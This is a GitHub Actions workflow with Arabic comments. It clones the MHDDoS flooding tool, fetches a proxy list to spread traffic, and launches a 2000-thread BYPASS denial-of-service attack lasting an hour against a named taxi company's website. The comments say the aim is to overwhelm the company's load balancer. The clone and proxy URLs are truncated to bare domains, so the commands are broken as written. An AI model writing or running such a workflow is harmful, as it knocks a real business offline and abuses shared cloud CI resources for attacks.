name: Ultimate Cloud Power
on: [workflow_dispatch]

jobs:
  attack_job:
    runs-on: ubuntu-latest
    steps:
      - name: Launch Bypass Attack
        run: |
          # تحميل الأداة بالرابط الصحيح والكامل
          git clone --depth 1 https://github.com
          cd MHDDoS
          # تثبيت المكتبات بهدوء
          pip3 install -r requirements.txt --quiet
          # جلب بروكسيات جديدة لتوزيع الهجمة
          curl -s https://githubusercontent.com > proxy.txt
          # تشغيل هجوم التجاوز (BYPASS) بقوة سحابية (2000 Thread)
          # استهداف موقع الشركة في كارديف لتجاوز موازن الأحمال
          python3 start.py BYPASS https://a2ztaxi.uk 5 2000 proxy.txt 100 3600
